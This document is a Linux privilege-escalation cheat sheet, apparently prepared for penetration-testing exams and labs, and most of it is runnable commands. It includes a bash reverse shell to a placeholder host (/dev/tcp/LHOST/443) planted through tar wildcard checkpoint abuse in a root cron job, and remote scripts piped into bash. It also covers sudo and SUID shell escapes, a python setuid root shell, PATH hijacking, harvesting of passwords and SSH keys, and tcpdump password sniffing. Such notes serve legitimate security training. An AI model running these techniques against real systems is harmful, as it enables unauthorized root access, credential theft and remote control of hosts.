# Linux Privilege Escalation

## Philosophy

Same as Windows: **misconfiguration > credentials > kernel**. LinPEAS is a force multiplier, not a substitute for reading cron and sudo.

## Immediate recon

```bash
id
whoami
hostname
uname -a
cat /etc/os-release
sudo -l
env
cat ~/.bashrc ~/.profile 2>/dev/null
history
ls -la /home
ip a
ss -tlnp
ps auxf
```

## Automated enum

```bash
# Transfer linpeas
curl http://LHOST/linpeas.sh | bash
# or
wget http://LHOST/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```

Also useful: `pspy` for runtime cron detection without root.

```bash
./pspy64
```

---

## sudo abuse

```bash
sudo -l
```

| Finding | Idea |
|---------|------|
| `(ALL) NOPASSWD: /usr/bin/vim` | `:!sh` or GTFOBins |
| `NOPASSWD: /usr/bin/find` | `sudo find . -exec /bin/sh \;` |
| Limited script | Read script for writable includes / env |
| `SETENV` | Hijack `LD_PRELOAD` / `PATH` if allowed |

Always check [GTFOBins](https://gtfobins.github.io/).

```bash
# Example
sudo vim -c ':!/bin/sh'
sudo less /etc/passwd   # then !sh
```

---

## SUID / capabilities

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

Interesting binaries: `bash`, `find`, `python`, `perl`, `nmap` (old interactive), `env`, `awk`, custom app binaries.

```bash
# Example capability
getcap /usr/bin/python3.8
# cap_setuid+ep → python to setuid(0)
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## Cron & timers (wildcard abuse)

### Concept — tar wildcard abuse

If root cron runs something like:

```bash
cd /var/backups && tar czf /tmp/backup.tar.gz *
```

The shell expands `*`. Attacker-controlled filenames become **argv** to `tar`.

Checkpoint/action abuse pattern:

```bash
cd /home/user/backup_dir   # directory tar'ed by root
echo 'bash -i >& /dev/tcp/LHOST/443 0>&1' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# wait for cron
```

Reference pattern: [Exploiting Wildcard for Privilege Escalation](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

### Enumeration

```bash
ls -lah /etc/cron*
cat /etc/crontab
grep CRON /var/log/syslog
systemctl list-timers
# watch processes
watch -n 1 "ps -aux | grep -v grep"
```

Writable script executed by root is an instant win — overwrite carefully and restore after.

---

## Credentials & files

```bash
# Histories
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null

# Configs
grep -Rni "password" /var/www 2>/dev/null | head
find /var/www -name "*.php" | xargs grep -ni "pass\|mysql\|pdo" 2>/dev/null | head

# SSH
ls -la ~/.ssh /home/*/.ssh 2>/dev/null
cat id_rsa

# Mail / logs (if group readable)
find / -group adm -readable 2>/dev/null
grep -R "pass" /var/log 2>/dev/null | head
```

```bash
# Writable dirs
find / -writable -type d 2>/dev/null
```

KeePass and other vaults:

```bash
find / -name '*.kdbx' 2>/dev/null
# transfer offline, keepass2john + hashcat/john
```

---

## PATH / wildcard script hijack

If root runs `script.sh` with relative command names and your dir is in PATH or cwd is attacker-writable:

```bash
echo '/bin/bash' > /tmp/path_hijack/ps
chmod +x /tmp/path_hijack/ps
export PATH=/tmp/path_hijack:$PATH
```

---

## Docker / LXD / sockets

```bash
id | grep docker
ls -la /var/run/docker.sock
```

Docker group ≈ root on host via mounted escape patterns.

---

## Kernel exploits (last resort)

When misconfigs are dry, a version-matched kernel exploit may still apply (example class: CVE-2018-18955). Rules:

1. Confirm exact kernel: `uname -a`
2. Prefer **compiled, well-known** exploits with matching version
3. Expect instability — snapshot if lab allows
4. Look for leftover SUID shells in `/tmp` after semi-successful runs

```bash
searchsploit linux kernel 4.x
# example public references:
# https://www.exploit-db.com/exploits/45886
# https://github.com/bcoles/kernel-exploits
```

**Exam hygiene:** Kernel is slower and noisier than sudo/SUID/cron. Use when linpeas screams and misconfigs are dry.

---

## Network / sniffing

If you can run tcpdump as low-priv on lo (or sudo tcpdump limited):

```bash
sudo tcpdump -i lo -A | grep -i pass
```

Cleartext auth between local services appears more often than expected.

---

## NFS / mounts

```bash
cat /etc/exports
showmount -e TARGET
# no_root_squash → mount and create SUID bash as root from attacker
```

---

## Decision tree

```text
sudo -l interesting?
  └─ GTFOBins / script abuse
SUID/cap interesting?
  └─ GTFOBins / custom binary RE
Cron / timer writable or wildcard?
  └─ Hijack
Creds in files/history?
  └─ su / ssh / reuse
Docker / privileged groups?
  └─ Escape
Kernel match + reliable exploit?
  └─ Last resort
```

## Proof commands (root)

```bash
id
hostname
ip a
cat /root/proof.txt
# screenshot
```
